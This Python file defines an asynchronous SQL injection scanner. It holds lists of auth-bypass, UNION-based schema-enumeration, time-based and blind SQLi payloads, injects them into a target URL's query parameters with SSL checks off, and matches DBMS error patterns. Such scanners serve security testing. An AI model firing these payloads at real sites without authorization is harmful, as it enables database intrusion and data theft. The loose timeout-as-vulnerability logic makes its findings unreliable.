import asyncio
import aiohttp
import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class SqliScanner:
    """Comprehensive SQL Injection Scanner"""
    
    # SQL Injection Payloads
    ERROR_BASED_PAYLOADS = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
    ]
    
    UNION_BASED_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT 'a',NULL,NULL--",
        "' UNION SELECT NULL,'a',NULL--",
        "' UNION SELECT database(),user(),version()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    ]
    
    TIME_BASED_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "'; SELECT SLEEP(5)--",
    ]
    
    BLIND_PAYLOADS = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]
    
    # SQL Error patterns
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL.*Server",
        r"OLE DB.*SQL Server",
        r"\[Microsoft\]\[ODBC SQL Server Driver\]",
        r"\[SQLServer JDBC Driver\]",
        r"Incorrect syntax near",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"sqlite3.OperationalError",
        r"SQLite/JDBCDriver",
        r"System.Data.SQLite.SQLiteException",
    ]
    
    def __init__(self, target_url: str, scan_type: str = "auto", timeout: int = 10):
        self.target_url = target_url
        self.scan_type = scan_type
        self.timeout = timeout
        self.results: List[Dict] = []
        self.max_concurrent = 10  # Parallel requests for speed
        
    def get_payloads(self) -> List[str]:
        """Get payloads based on scan type"""
        if self.scan_type == "error":
            return self.ERROR_BASED_PAYLOADS
        elif self.scan_type == "union":
            return self.UNION_BASED_PAYLOADS
        elif self.scan_type == "time":
            return self.TIME_BASED_PAYLOADS
        elif self.scan_type == "blind":
            return self.BLIND_PAYLOADS
        else:  # auto
            return (self.ERROR_BASED_PAYLOADS + 
                   self.UNION_BASED_PAYLOADS[:5] + 
                   self.TIME_BASED_PAYLOADS[:3])
    
    def check_sql_error(self, response_text: str) -> Optional[str]:
        """Check if response contains SQL error"""
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        return None
    
    def detect_dbms(self, response_text: str) -> Optional[str]:
        """Detect database management system from error"""
        dbms_patterns = {
            'MySQL': [r'MySQL', r'mysql_', r'MySqlClient'],
            'PostgreSQL': [r'PostgreSQL', r'pg_', r'Npgsql'],
            'SQL Server': [r'SQL Server', r'ODBC SQL Server', r'SQLServer JDBC'],
            'Oracle': [r'ORA-', r'Oracle', r'oci_'],
            'SQLite': [r'SQLite', r'sqlite3'],
        }
        
        for dbms, patterns in dbms_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return dbms
        return None
    
    async def test_payload(self, session: aiohttp.ClientSession, payload: str) -> Dict:
        """Test a single SQL injection payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        # Test each parameter
        for param_name in params.keys():
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            start_time = time.time()
            try:
                async with session.get(test_url, timeout=self.timeout, ssl=False) as response:
                    response_time = time.time() - start_time
                    response_text = await response.text()
                    
                    # Check for SQL errors
                    error_pattern = self.check_sql_error(response_text)
                    if error_pattern:
                        dbms = self.detect_dbms(response_text)
                        return {
                            'url': test_url,
                            'vulnerable': True,
                            'type': 'Error-based SQLi',
                            'payload': payload,
                            'severity': 'High',
                            'parameter': param_name,
                            'dbms': dbms,
                            'response': response_text[:500]
                        }
                    
                    # Check for time-based SQLi
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                        if response_time >= 4.5:  # Should delay ~5 seconds
                            return {
                                'url': test_url,
                                'vulnerable': True,
                                'type': 'Time-based SQLi',
                                'payload': payload,
                                'severity': 'High',
                                'parameter': param_name,
                                'response': f'Response delayed by {response_time:.2f}s'
                            }
                    
            except asyncio.TimeoutError:
                # Timeout might indicate successful time-based SQLi
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                    return {
                        'url': self.target_url,
                        'vulnerable': True,
                        'type': 'Time-based SQLi (Timeout)',
                        'payload': payload,
                        'severity': 'High',
                        'parameter': param_name,
                        'response': 'Request timed out (possible SQLi)'
                    }
            except Exception as e:
                pass
        
        return None
    
    async def scan(self) -> List[Dict]:
        """Execute SQL injection scan - ENHANCED FOR SPEED"""
        payloads = self.get_payloads()
        results = []
        
        connector = aiohttp.TCPConnector(ssl=False, limit=self.max_concurrent)
        timeout_settings = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_settings) as session:
            # Process payloads in batches for maximum speed
            batch_size = self.max_concurrent
            for i in range(0, len(payloads), batch_size):
                batch = payloads[i:i+batch_size]
                tasks = [self.test_payload(session, payload) for payload in batch]
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                for response in responses:
                    if response and isinstance(response, dict):
                        results.append(response)
        
        # If no vulnerabilities found, add a safe result
        if not results:
            results.append({
                'url': self.target_url,
                'vulnerable': False,
                'type': 'No vulnerability detected',
                'payload': 'N/A',
                'severity': 'None',
                'response': 'All payloads returned normal responses'
            })
        
        return results
